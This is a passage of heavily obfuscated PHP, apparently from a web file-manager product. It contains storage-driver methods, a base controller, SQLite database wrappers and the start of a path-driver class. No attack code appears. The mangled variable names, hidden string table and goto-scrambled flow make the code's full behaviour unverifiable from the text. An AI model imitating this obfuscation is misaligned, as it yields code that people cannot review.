($ºÁş¥ğ° == $ª¤¦—ã[68] && stripos($Ì›ñêÆƒ, $ª¤¦—ã[2349])) { $£æìÂ„ = explode($ª¤¦—ã[10], $Ì›ñêÆƒ); $¦‚´² = isset($£æìÂ„[1]) ? $£æìÂ„[1] : $ª¤¦—ã[12]; $«¡¼·ßš = array($ª¤¦—ã[2350] => LNG($ª¤¦—ã[2351]), $ª¤¦—ã[2352] => LNG($ª¤¦—ã[2353])); if (isset($«¡¼·ßš[$¦‚´²])) { $Ì›ñêÆƒ = $«¡¼·ßš[$¦‚´²]; } } if (stripos($Ì›ñêÆƒ, $ª¤¦—ã[2354]) === 0) { $…ó½Ÿ»Æ = strpos($Ì›ñêÆƒ, $ª¤¦—ã[178]); if ($…ó½Ÿ»Æ === !1) { $…ó½Ÿ»Æ = strpos($Ì›ñêÆƒ, $ª¤¦—ã[4]); } if ($…ó½Ÿ»Æ !== !1) { $Ì›ñêÆƒ = substr($Ì›ñêÆƒ, $…ó½Ÿ»Æ + 1); } } $Ì›ñêÆƒ = LNG($ª¤¦—ã[1283]) . $Ì›ñêÆƒ; if ($úêüË’ı) { return $Ì›ñêÆƒ; } show_json($Ì›ñêÆƒ, !1); } public function driverListSystem() { $ƒõì¢’€ =& $_SERVER[ùèÅ´Ãš]; $â€Î¥¹Í = parent::listData(); $èÖâØ· = array(); foreach ($â€Î¥¹Í as $û›¨µå) { unset($û›¨µå[$ƒõì¢’€[234]], $û›¨µå[$ƒõì¢’€[88]]); if (!is_array($û›¨µå[$ƒõì¢’€[6]])) { $û›¨µå[$ƒõì¢’€[6]] = json_decode($û›¨µå[$ƒõì¢’€[6]], !0); } $èÖâØ·[] = $û›¨µå; } return $èÖâØ·; } public function defaultDriver() { $àÇÑÄ¬š =& $_SERVER[ùèÅ´Ãš]; $¥Ï¡é¯Ø = parent::listData(); $ú×‘½ªŞ = array_filter_by_field($¥Ï¡é¯Ø, $àÇÑÄ¬š[37], 1); $ú×‘½ªŞ = $ú×‘½ªŞ[0]; if (!$ú×‘½ªŞ) { return array(); } if (!is_array($ú×‘½ªŞ[$àÇÑÄ¬š[6]])) { $ú×‘½ªŞ[$àÇÑÄ¬š[6]] = json_decode($ú×‘½ªŞ[$àÇÑÄ¬š[6]], !0); } return $ú×‘½ªŞ; } public function driverInfo($Á²¾úÖú) { $±¹İèàÈ =& $_SERVER[ùèÅ´Ãš]; $ë£¥Ñª = array_to_keyvalue(parent::listData(), $±¹İèàÈ[477]); if (!isset($ë£¥Ñª[$Á²¾úÖú])) { return !1; } $ªñ…àĞ = $ë£¥Ñª[$Á²¾úÖú]; if (!is_array($ªñ…àĞ[$±¹İèàÈ[6]])) { $ªñ…àĞ[$±¹İèàÈ[6]] = json_decode($ªñ…àĞ[$±¹İèàÈ[6]], !0); } return $ªñ…àĞ; } public function remove($ÀñÙ»ƒ‘) { $this->removeShareItems($ÀñÙ»ƒ‘); return parent::remove($ÀñÙ»ƒ‘); } public function removeWithFile($¤œ€ß¯¶, $ÍÛìÆØ, $åÚØñ’Å, $î£å—øœ = false) { $Ãã¦¦‰÷ =& $_SERVER[ùèÅ´Ãš]; $ïèÉñéŸ = array($Ãã¦¦‰÷[901] => $¤œ€ß¯¶); $¢ÀÚ˜ºº = Model($Ãã¦¦‰÷[548])->where($ïèÉñéŸ)->count(); $í¼İ‰ç = Model($Ãã¦¦‰÷[548])->where($ïèÉñéŸ)->sum($Ãã¦¦‰÷[79]); $‰²¿Ø¡¥ = $ÍÛìÆØ . $Ãã¦¦‰÷[2355] . $¤œ€ß¯¶; $âğæ›†Î = LNG($ÍÛìÆØ == $Ãã¦¦‰÷[627] ? $Ãã¦¦‰÷[2356] : $Ãã¦¦‰÷[2357]); $ìË“ë†Ù = new TaskFileTransfer($‰²¿Ø¡¥, $Ãã¦¦‰÷[216], $¢ÀÚ˜ºº, $âğæ›†Î . $Ãã¦¦‰÷[464] . $åÚØñ’Å[$Ãã¦¦‰÷[32]] . $Ãã¦¦‰÷[215] . $¤œ€ß¯¶); $ìË“ë†Ù->task[$Ãã¦¦‰÷[841]] = (double) $í¼İ‰ç; $ş‹½Ê† = KodIO::defaultDriver(); $úôûêÄé = $ş‹½Ê†[$Ãã¦¦‰÷[477]]; $Ó¯øï¡ = $²¦İ¦Ù´ = $‰£üã²  = array(); $½—şÛ™ = Model($Ãã¦¦‰÷[233])->where($ïèÉñéŸ)->field($Ãã¦¦‰÷[2358])->select(); foreach ($½—şÛ™ as $ŒõË·úÍ) { $€óº·ÜÕ = $ŒõË·úÍ[$Ãã¦¦‰÷[545]]; if ($î£å—øœ) { $²¦İ¦Ù´[] = $€óº·ÜÕ; continue; } $Ï¸ Ü’å = $ŒõË·úÍ[$Ãã¦¦‰÷[87]]; $îºŠ•ó = get_path_father($Ï¸ Ü’å); $‰£üã² [] = $îºŠ•ó; $îºŠ•ó = str_replace("\173\x69\157\x3a{$¤œ€ß¯¶}\175\57", "\x7b\151\x6f\72{$úôûêÄé}\x7d\x2f", $îºŠ•ó); if (!IO::exist($Ï¸ Ü’å)) { $Ó¯øï¡[] = $€óº·ÜÕ; $ìË“ë†Ù->updateFileEnd($ŒõË·úÍ[$Ãã¦¦‰÷[32]], $ŒõË·úÍ[$Ãã¦¦‰÷[79]]); write_log($Ãã¦¦‰÷[2359] . $Ï¸ Ü’å, $Ãã¦¦‰÷[1930]); continue; } $ºµãÀÆ¨ = IO::move($Ï¸ Ü’å, $îºŠ•ó, REPEAT_RENAME); if (!$ºµãÀÆ¨) { $²¦İ¦Ù´[] = $€óº·ÜÕ; $ìË“ë†Ù->updateFileEnd($ŒõË·úÍ[$Ãã¦¦‰÷[32]], $ŒõË·úÍ[$Ãã¦¦‰÷[79]]); write_log($Ãã¦¦‰÷[2360] . $Ï¸ Ü’å, $Ãã¦¦‰÷[1930]); continue; } $ïèÉñéŸ = array($Ãã¦¦‰÷[545] => $€óº·ÜÕ); $Æ“†ş‡ = array($Ãã¦¦‰÷[901] => $úôûêÄé, $Ãã¦¦‰÷[87] => $ºµãÀÆ¨); Model($Ãã¦¦‰÷[233])->where($ïèÉñéŸ)->save($Æ“†ş‡); } $«­çÙ°œ = $ìË“ë†Ù->task; if (!$î£å—øœ) { Cache::set($‰²¿Ø¡¥, $«­çÙ°œ); } $ìË“ë†Ù->end(); $Ó¯øï¡ = array_unique($Ó¯øï¡); $²¦İ¦Ù´ = array_unique($²¦İ¦Ù´); if (!$î£å—øœ && ($Ó¯øï¡ || $²¦İ¦Ù´)) { $¹Î©•é = array(); if ($Ó¯øï¡) { $¹Î©•é[] = sprintf(LNG($Ãã¦¦‰÷[2361]), count($Ó¯øï¡)); } if ($²¦İ¦Ù´) { $¹Î©•é[] = sprintf(LNG($Ãã¦¦‰÷[2362]), count($²¦İ¦Ù´)); } $¹Î©•é = sprintf(LNG($Ãã¦¦‰÷[2363]), implode($Ãã¦¦‰÷[2364], $¹Î©•é)) . $Ãã¦¦‰÷[2365] . date($Ãã¦¦‰÷[2366]) . $Ãã¦¦‰÷[2367]; if ($ÍÛìÆØ == $Ãã¦¦‰÷[1241]) { $¹Î©•é .= $Ãã¦¦‰÷[2368] . LNG($Ãã¦¦‰÷[2369]); } else { $¹Î©•é = LNG($Ãã¦¦‰÷[2370]) . $Ãã¦¦‰÷[2371] . $¹Î©•é; } $«­çÙ°œ[$Ãã¦¦‰÷[1278]] = $¹Î©•é; Cache::set($‰²¿Ø¡¥, $«­çÙ°œ); unset($åÚØñ’Å[$Ãã¦¦‰÷[6]]); $ü•Ö¬º” = array($Ãã¦¦‰÷[477] => $¤œ€ß¯¶, $Ãã¦¦‰÷[2240] => $Ãã¦¦‰÷[627], $Ãã¦¦‰÷[32] => $åÚØñ’Å[$Ãã¦¦‰÷[32]], $Ãã¦¦‰÷[98] => $åÚØñ’Å[$Ãã¦¦‰÷[98]]); Hook::trigger($Ãã¦¦‰÷[1808], array($Ãã¦¦‰÷[1301] => $ü•Ö¬º”, $Ãã¦¦‰÷[1311] => !0)); show_json($¹Î©•é, !1, 100111); } if ($ÍÛìÆØ == $Ãã¦¦‰÷[627]) { return !0; } if ($Ó¯øï¡ || $²¦İ¦Ù´) { $Æè €®· = array_merge($Ó¯øï¡, $²¦İ¦Ù´); $Æè €®· = array_filter(array_unique($Æè €®·)); $this->removeByFileID($Æè €®·); } if ($‰£üã² ) { $‰£üã²  = array_filter(array_unique($‰£üã² )); foreach ($‰£üã²  as $Ï¸ Ü’å) { $š¬îª = IO::has($Ï¸ Ü’å, !0); if (!$š¬îª[$Ãã¦¦‰÷[242]] && !$š¬îª[$Ãã¦¦‰÷[243]]) { IO::remove($Ï¸ Ü’å); } } } return $this->remove($¤œ€ß¯¶); } private function removeByFileID($Ö­ßÑ§¶ = array()) { $•¹ú³ÕÊ =& $_SERVER[ùèÅ´Ãš]; if (empty($Ö­ßÑ§¶)) { return; } $ŠÂ­™‡µ = array($•¹ú³ÕÊ[545] => array($•¹ú³ÕÊ[7], $Ö­ßÑ§¶)); $¨×ÔÇíˆ = Model($•¹ú³ÕÊ[1442])->where($ŠÂ­™‡µ)->field($•¹ú³ÕÊ[2316])->select(); if (!$¨×ÔÇíˆ) { return Model($•¹ú³ÕÊ[548])->remove($Ö­ßÑ§¶); } $¨×ÔÇíˆ = array_to_keyvalue($¨×ÔÇíˆ, $•¹ú³ÕÊ[194], $•¹ú³ÕÊ[545]); foreach ($¨×ÔÇíˆ as $ŒŸÇáÕ• => $Éï¹×Ù) { Model($•¹ú³ÕÊ[908])->removeNow($ŒŸÇáÕ•, !1); } $£Ÿ˜Õ² = array_diff($Ö­ßÑ§¶, array_unique(array_values($¨×ÔÇíˆ))); if ($£Ÿ˜Õ²) { return Model($•¹ú³ÕÊ[548])->remove($£Ÿ˜Õ²); } } private function removeShareItems($”Ù‚´õÏ) { $é´ü© =& $_SERVER[ùèÅ´Ãš]; $×«÷ƒÉ£ = "\173\151\x6f\x3a{$”Ù‚´õÏ}\x7d\x2f"; $°Ï³ç»ã = array($é´ü©[194] => 0, $é´ü©[1271] => array($é´ü©[461], "{$×«÷ƒÉ£}\45")); $Å©ó¨Ã• = Model($é´ü©[1977])->where($°Ï³ç»ã)->field($é´ü©[672])->select(); if (empty($Å©ó¨Ã•)) { return; } $¹Ğãâ§í = array_to_keyvalue($Å©ó¨Ã•, $é´ü©[12], $é´ü©[672]); Model($é´ü©[671])->remove($¹Ğãâ§í); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\114\x69\x67\x68\x74\x41\x70\x70"; public $modelType = "\123\x79\x73\164\145\x6d\117\x70\164\151\157\x6e"; public $field = array("\x6e\141\155\145", "\147\162\157\165\x70", "\x64\145\163\143", "\x63\157\156\164\145\x6e\164"); public function listData($ñîß«Õã = false, $æÉ•óšĞ = "\x6d\157\144\x69\x66\x79\x54\x69\155\x65", $Ó¦ÀÙŠŸ = true) { return parent::listData($ñîß«Õã, $æÉ•óšĞ, $Ó¦ÀÙŠŸ); } public function remove($Ø‚îŸøğ) { $‘Ñ‚ú´¦ = $this->findByName($Ø‚îŸøğ); if (!$‘Ñ‚ú´¦) { return !1; } return parent::remove($‘Ñ‚ú´¦[$_SERVER[ùèÅ´Ãš][477]]); } public function add($à§­ûöÉ) { if ($this->findByName($à§­ûöÉ[$_SERVER[ùèÅ´Ãš][32]])) { return !1; } return parent::insert($à§­ûöÉ); } public function update($°©Éş·†, $Âç°ëúâ) { $šÖ›´õû =& $_SERVER[ùèÅ´Ãš]; $ŠÒÙäÍ© = $this->findByName($°©Éş·†); $´Éƒòä  = $this->findByName($Âç°ëúâ[$šÖ›´õû[32]]); if (!$ŠÒÙäÍ© || $´Éƒòä  && $´Éƒòä [$šÖ›´õû[477]] != $ŠÒÙäÍ©[$šÖ›´õû[477]]) { return !1; } return parent::update($ŠÒÙäÍ©[$šÖ›´õû[477]], $Âç°ëúâ); } } goto EÔä¤ŠªÏÃ; f¥÷Â‘èŞø: define($_SERVER[ùèÅ´Ãš][320], 3); define($_SERVER[ùèÅ´Ãš][321], 1); define($_SERVER[ùèÅ´Ãš][322], 0); goto D®Š»…Ò×Ï; aĞ‹òŒšÁ˜: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $†¦…Ó¢ˆ =& $_SERVER[ùèÅ´Ãš]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$†¦…Ó¢ˆ[6]] =& $config; $this->values[$†¦…Ó¢ˆ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $†¦…Ó¢ˆ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ü•¼Œûî) { if (1 === func_num_args()) { $this->{$Ü•¼Œûî} = new $Ü•¼Œûî(); } else { $œ­µÌ¶ä = new ReflectionClass($Ü•¼Œûî); $Ò´É¡„Ÿ = func_get_args(); array_shift($Ò´É¡„Ÿ); $this->{$Ü•¼Œûî} = $œ­µÌ¶ä->newInstanceArgs($Ò´É¡„Ÿ); } return $this->{$Ü•¼Œûî}; } public function routeBind($„›òŠà, $½úîÅÚ±, $Èè¨Æµ = 3) { $ó¥¥ßØ¡ =& $_SERVER[ùèÅ´Ãš]; $°ÔÉµË = $this->in[$ó¥¥ßØ¡[9]]; $„›òŠà = str_replace($ó¥¥ßØ¡[10], $ó¥¥ßØ¡[11], trim(trim($„›òŠà, $ó¥¥ßØ¡[8]), $ó¥¥ßØ¡[12])); if (!$„›òŠà || count($°ÔÉµË) <= $Èè¨Æµ) { return !1; } $ÅÙÚùş“ = !0; $ÍÎîˆğº = explode($ó¥¥ßØ¡[8], $„›òŠà); for ($–¢ı¾÷® = 0; $–¢ı¾÷® < count($ÍÎîˆğº); $–¢ı¾÷®++) { if ($ÍÎîˆğº[$–¢ı¾÷®] != $°ÔÉµË[$Èè¨Æµ + $–¢ı¾÷®]) { $ÅÙÚùş“ = !1; break; } } if (!$ÅÙÚùş“) { return; } call_user_func_array(array($this, $½úîÅÚ±), array()); } public function routeArgs($ìŞ“÷„£ = 3) { $ÁıÄ¨Õ = $this->in[$_SERVER[ùèÅ´Ãš][9]]; if (count($ÁıÄ¨Õ) <= $ìŞ“÷„£) { return array(); } $¦§¢À¤ = array(); for ($ÀÂæ„ë = $ìŞ“÷„£; $ÀÂæ„ë < count($ÁıÄ¨Õ); $ÀÂæ„ë += 2) { $¦§¢À¤[$ÁıÄ¨Õ[$ÀÂæ„ë]] = $ÁıÄ¨Õ[$ÀÂæ„ë + 1]; $this->in[$ÁıÄ¨Õ[$ÀÂæ„ë]] = $ÁıÄ¨Õ[$ÀÂæ„ë + 1]; } return $¦§¢À¤; } protected function assign($¿Ç¤á§Ğ, $˜ãÒ¦ù¨) { $this->values[$¿Ç¤á§Ğ] = $˜ãÒ¦ù¨; } protected function display($¼ç„ÎÕñ) { ob_end_clean(); extract($this->values); require $this->tpl . $¼ç„ÎÕñ; } } class DbSqliteBase extends Db { public function __construct($¬û¶–ãã = '') { $Ã¹­ß´× =& $_SERVER[ùèÅ´Ãš]; if (!extension_loaded($Ã¹­ß´×[13])) { think_exception(think_lang($Ã¹­ß´×[14]) . $Ã¹­ß´×[15]); } if (!empty($¬û¶–ãã)) { if (!isset($¬û¶–ãã[$Ã¹­ß´×[16]])) { $¬û¶–ãã[$Ã¹­ß´×[16]] = 438; } $this->config = $¬û¶–ãã; if (empty($this->config[$Ã¹­ß´×[17]])) { $this->config[$Ã¹­ß´×[17]] = array(); } } } public function connect($‹»ó—ıß = '', $«‡ÀÍõÍ = 0) { $è°Ü¹Ô£ =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->linkID[$«‡ÀÍõÍ])) { if (empty($‹»ó—ıß)) { $‹»ó—ıß = $this->config; } $„îù·€ª = !empty($‹»ó—ıß[$è°Ü¹Ô£[17]][$è°Ü¹Ô£[18]]) ? $‹»ó—ıß[$è°Ü¹Ô£[17]][$è°Ü¹Ô£[18]] : $this->pconnect; $çÓè§à = $„îù·€ª ? $è°Ü¹Ô£[19] : $è°Ü¹Ô£[20]; $this->linkID[$«‡ÀÍõÍ] = $çÓè§à($‹»ó—ıß[$è°Ü¹Ô£[21]], $‹»ó—ıß[$è°Ü¹Ô£[16]]); if (!$this->linkID[$«‡ÀÍõÍ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$«‡ÀÍõÍ], 30000); if (1 != think_config($è°Ü¹Ô£[22])) { unset($this->config); } } return $this->linkID[$«‡ÀÍõÍ]; } public function free() { $this->queryID = null; } public function query($±Š¥ÍÌê) { $™çõ¬ÓÓ =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±Š¥ÍÌê; if ($this->queryID) { $this->free(); } think_action_status($™çõ¬ÓÓ[23], 1); think_status($™çõ¬ÓÓ[24]); $this->queryID = sqlite_query($this->_linkID, $±Š¥ÍÌê); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $—àŞÚñ = $this->getAll(); return $—àŞÚñ; } } public function execute($îÊ€Ì£ˆ) { $¦˜ÙÓÓ† =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $îÊ€Ì£ˆ; if ($this->queryID) { $this->free(); } think_action_status($¦˜ÙÓÓ†[25], 1); think_status($¦˜ÙÓÓ†[24]); $ÍüıãŒ = sqlite_exec($this->_linkID, $îÊ€Ì£ˆ); $this->debug(); if (!1 === $ÍüıãŒ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ùèÅ´Ãš][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ê’øŸ¹Ó = sqlite_query($this->_linkID, $_SERVER[ùèÅ´Ãš][27]); if (!$ê’øŸ¹Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¼£âŠ–é = sqlite_query($this->_linkID, $_SERVER[ùèÅ´Ãš][28]); if (!$¼£âŠ–é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $º“Š¦âá = array(); if ($this->numRows > 0) { for ($Êİ¼·€ = 0; $Êİ¼·€ < $this->numRows; $Êİ¼·€++) { $º“Š¦âá[$Êİ¼·€] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $º“Š¦âá; } public function getFields($ä±³®éØ) { $ì¢—í£ =& $_SERVER[ùèÅ´Ãš]; $ÓğÄËº¦ = $this->query($ì¢—í£[29] . $ä±³®éØ . $ì¢—í£[30]); $â „ºø = array(); if ($ÓğÄËº¦) { foreach ($ÓğÄËº¦ as $í‰Ââ´è => $¨Ó”“ÇÌ) { $â „ºø[$¨Ó”“ÇÌ[$ì¢—í£[31]]] = array($ì¢—í£[32] => $¨Ó”“ÇÌ[$ì¢—í£[31]], $ì¢—í£[33] => $¨Ó”“ÇÌ[$ì¢—í£[34]], $ì¢—í£[35] => (bool) ($¨Ó”“ÇÌ[$ì¢—í£[36]] === $ì¢—í£[12]), $ì¢—í£[37] => $¨Ó”“ÇÌ[$ì¢—í£[38]], $ì¢—í£[39] => strtolower($¨Ó”“ÇÌ[$ì¢—í£[40]]) == $ì¢—í£[41], $ì¢—í£[42] => strtolower($¨Ó”“ÇÌ[$ì¢—í£[43]]) == $ì¢—í£[44]); } } return $â „ºø; } public function getTables($‰€à‘¡æ = '') { $ÃÔâ¹µ® =& $_SERVER[ùèÅ´Ãš]; $•€Î–óß = $this->query($ÃÔâ¹µ®[45] . $ÃÔâ¹µ®[46] . $ÃÔâ¹µ®[47]); $¿ª¼İÕî = array(); foreach ($•€Î–óß as $“õ¿°õ“ => $ÍşİºæÀ) { $¿ª¼İÕî[$“õ¿°õ“] = current($ÍşİºæÀ); } return $¿ª¼İÕî; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÔÊÊ÷Û =& $_SERVER[ùèÅ´Ãš]; $ù¹·äØ­ = sqlite_last_error($this->_linkID); $this->error = $ù¹·äØ­ . $ÔÊÊ÷Û[4] . sqlite_error_string($ù¹·äØ­); if ($ÔÊÊ÷Û[12] != $this->queryStr) { $this->error .= LNG($ÔÊÊ÷Û[48]) . $this->queryStr; } think_trace($this->error, $ÔÊÊ÷Û[12], $ÔÊÊ÷Û[49]); return $this->error; } public function escapeString($“ÊÛÎ¿î) { return sqlite_escape_string($“ÊÛÎ¿î); } public function parseLimit($‚ıŒÅÚ§) { $„”ÇõØç =& $_SERVER[ùèÅ´Ãš]; $ğˆ»¥¬è = $„”ÇõØç[12]; if (!empty($‚ıŒÅÚ§)) { $‚ıŒÅÚ§ = explode($„”ÇõØç[50], $‚ıŒÅÚ§); if (count($‚ıŒÅÚ§) > 1) { $ğˆ»¥¬è .= $„”ÇõØç[51] . $‚ıŒÅÚ§[1] . $„”ÇõØç[52] . $‚ıŒÅÚ§[0] . $„”ÇõØç[53]; } else { $ğˆ»¥¬è .= $„”ÇõØç[51] . $‚ıŒÅÚ§[0] . $„”ÇõØç[53]; } } return $ğˆ»¥¬è; } } class DbSqlite3Base extends Db { public function __construct($ÙÌæĞÖ = '') { $Œ†·¦Ù =& $_SERVER[ùèÅ´Ãš]; if (!class_exists($Œ†·¦Ù[54])) { think_exception(think_lang($Œ†·¦Ù[14]) . $Œ†·¦Ù[55]); } if (!empty($ÙÌæĞÖ)) { if (!isset($ÙÌæĞÖ[$Œ†·¦Ù[16]])) { $ÙÌæĞÖ[$Œ†·¦Ù[16]] = 438; } $this->config = $ÙÌæĞÖ; if (empty($this->config[$Œ†·¦Ù[17]])) { $this->config[$Œ†·¦Ù[17]] = array(); } } } public function connect($‰ËÃçï° = '', $€ÈâÎ¢È = 0) { $Í¸ôÀšœ =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->linkID[$€ÈâÎ¢È])) { if (empty($‰ËÃçï°)) { $‰ËÃçï° = $this->config; } $this->linkID[$€ÈâÎ¢È] = new SQLite3($‰ËÃçï°[$Í¸ôÀšœ[21]]); if (!$this->linkID[$€ÈâÎ¢È]) { think_exception($this->linkID[$€ÈâÎ¢È]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$€ÈâÎ¢È]->busyTimeout(30000); if (1 != think_config($Í¸ôÀšœ[22])) { unset($this->config); } } return $this->linkID[$€ÈâÎ¢È]; } public function free() { $this->queryID = null; } public function query($ÚäÒ¸·) { $ú÷õª‹ =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÚäÒ¸·; if ($this->queryID) { $this->free(); } think_action_status($ú÷õª‹[23], 1); think_status($ú÷õª‹[24]); $this->queryID = $this->_linkID->query($ÚäÒ¸·); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $İ¼ïÂÎ• = $this->getAll(); $this->numRows = count($İ¼ïÂÎ•); return $İ¼ïÂÎ•; } } public function execute($¢ƒğŒ†) { $«¦Œ –Û =& $_SERVER[ùèÅ´Ãš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢ƒğŒ†; if ($this->queryID) { $this->free(); } think_action_status($«¦Œ –Û[25], 1); think_status($«¦Œ –Û[24]); $î…»ïÔ¬ = $this->_linkID->exec($¢ƒğŒ†); $this->debug(); if (!1 === $î…»ïÔ¬) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ùèÅ´Ãš][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‘·ß—Û = $this->_linkID->query($_SERVER[ùèÅ´Ãš][27]); if (!$‘·ß—Û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $£Ë·„ŒÏ = $this->_linkID->query($_SERVER[ùèÅ´Ãš][28]); if (!$£Ë·„ŒÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $´“ùÆÃ = array(); while ($£©Ğº‰ë = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $´“ùÆÃ[] = $£©Ğº‰ë; } $this->queryID->reset(); return $´“ùÆÃ; } public function getFields($×Òş»‘¬) { $ôÔ›÷µ§ =& $_SERVER[ùèÅ´Ãš]; $–å‰¯ï = $this->query($ôÔ›÷µ§[29] . $×Òş»‘¬ . $ôÔ›÷µ§[30]); $Ï§¢º¾® = array(); if ($–å‰¯ï) { foreach ($–å‰¯ï as $¿œÜúĞ¾ => $˜­ÉÑÊ¼) { $Ï§¢º¾®[$˜­ÉÑÊ¼[$ôÔ›÷µ§[32]]] = array($ôÔ›÷µ§[32] => $˜­ÉÑÊ¼[$ôÔ›÷µ§[32]], $ôÔ›÷µ§[33] => $˜­ÉÑÊ¼[$ôÔ›÷µ§[33]], $ôÔ›÷µ§[35] => (bool) ($˜­ÉÑÊ¼[$ôÔ›÷µ§[35]] === $ôÔ›÷µ§[12]), $ôÔ›÷µ§[37] => $˜­ÉÑÊ¼[$ôÔ›÷µ§[56]], $ôÔ›÷µ§[39] => (bool) $˜­ÉÑÊ¼[$ôÔ›÷µ§[57]], $ôÔ›÷µ§[42] => (bool) $˜­ÉÑÊ¼[$ôÔ›÷µ§[57]]); } } return $Ï§¢º¾®; } public function getTables($ıœ¬ĞË = '') { $ĞÄ¥û¼á =& $_SERVER[ùèÅ´Ãš]; $¨çÃÜ€å = $this->query($ĞÄ¥û¼á[45] . $ĞÄ¥û¼á[46] . $ĞÄ¥û¼á[47]); $úŠ¯¥È = array(); foreach ($¨çÃÜ€å as $ì­ÎÑĞÖ => $½ãë…ú›) { $úŠ¯¥È[$ì­ÎÑĞÖ] = current($½ãë…ú›); } return $úŠ¯¥È; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ó°—Æ± =& $_SERVER[ùèÅ´Ãš]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ó°—Æ±[12] != $this->queryStr) { $this->error .= LNG($Ó°—Æ±[48]) . $this->queryStr; } think_trace($this->error, $Ó°—Æ±[12], $Ó°—Æ±[49]); return $this->error; } public function escapeString($¥ˆ’‰°¸) { $„”ÄÙ =& $_SERVER[ùèÅ´Ãš]; if ($this->_linkID) { return $this->_linkID->escapeString($¥ˆ’‰°¸); } return str_ireplace($„”ÄÙ[58], $„”ÄÙ[59], $¥ˆ’‰°¸); } public function parseLimit($Š§©’…) { $áï’Úû™ =& $_SERVER[ùèÅ´Ãš]; $Â³¥äš = $áï’Úû™[12]; if (!empty($Š§©’…)) { $Š§©’… = explode($áï’Úû™[50], $Š§©’…); if (count($Š§©’…) > 1) { $Â³¥äš .= $áï’Úû™[51] . $Š§©’…[1] . $áï’Úû™[52] . $Š§©’…[0] . $áï’Úû™[53]; } else { $Â³¥äš .= $áï’Úû™[51] . $Š§©’…[0] . $áï’Úû™[53]; } } return $Â³¥äš; } } goto CÔåËœ¼ÛÎ; CÔåËœ¼ÛÎ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $”ÇÁÙß© =& $_SERVER[ùèÅ´Ãš]; $this->objectDriver = array($”ÇÁÙß©[60], $”ÇÁÙß©[61], $”ÇÁÙß©[62], $”ÇÁÙß©[63], $”ÇÁÙß©[64], $”ÇÁÙß©[65], $”ÇÁÙß©[66], $”ÇÁÙß©[67], $”ÇÁÙß©[68], $”ÇÁÙß©[69], $”ÇÁÙß©[70], $”ÇÁÙß©[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($—ÜŠ¿…ø) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($—ÜŠ¿…ø, $_SERVER[ùèÅ´Ãš][8]); } return $—ÜŠ¿…ø; } public function iconvApp($—Ôç³ ) { return $—Ôç³ ; } public function iconvSystem($îÈ¤¸½µ) { return $îÈ¤¸½µ; } public function iconvTo($‹ÓÏâ§À, $†ø¡šª¦, $¿¯¼ÉË¶) { $ô½¯äı =& $_SERVER[ùèÅ´Ãš]; if (!$‹ÓÏâ§À || !function_exists($ô½¯äı[72])) { return $‹ÓÏâ§À; } static $Â½Ó½È = array(); $Ëîé˜ = $†ø¡šª¦ . $ô½¯äı[73] . $¿¯¼ÉË¶ . $ô½¯äı[74] . $‹ÓÏâ§À; if (isset($Â½Ó½È[$Ëîé˜])) { return $Â½Ó½È[$Ëîé˜]; } if (function_exists($ô½¯äı[75])) { $Œ¨è€ù = @mb_convert_encoding($‹ÓÏâ§À, $¿¯¼ÉË¶, $†ø¡šª¦); } else { $Œ¨è€ù = @iconv($†ø¡šª¦, $¿¯¼ÉË¶, $‹ÓÏâ§À); } $Œ¨è€ù = $Œ¨è€ù ? $Œ¨è€ù : $‹ÓÏâ§À; if (strstr($Œ¨è€ù, $ô½¯äı[76])) { $Œ¨è€ù = str_replace($ô½¯äı[76], $ô½¯äı[11], $Œ¨è€ù); } $Â½Ó½È[$†ø¡šª¦ . $ô½¯äı[73] . $¿¯¼ÉË¶ . $ô½¯äı[74] . $‹ÓÏâ§À] = $Œ¨è€ù; $Â½Ó½È[$¿¯¼ÉË¶ . $ô½¯äı[73] . $†ø¡šª¦ . $ô½¯äı[74] . $‹ÓÏâ§À] = 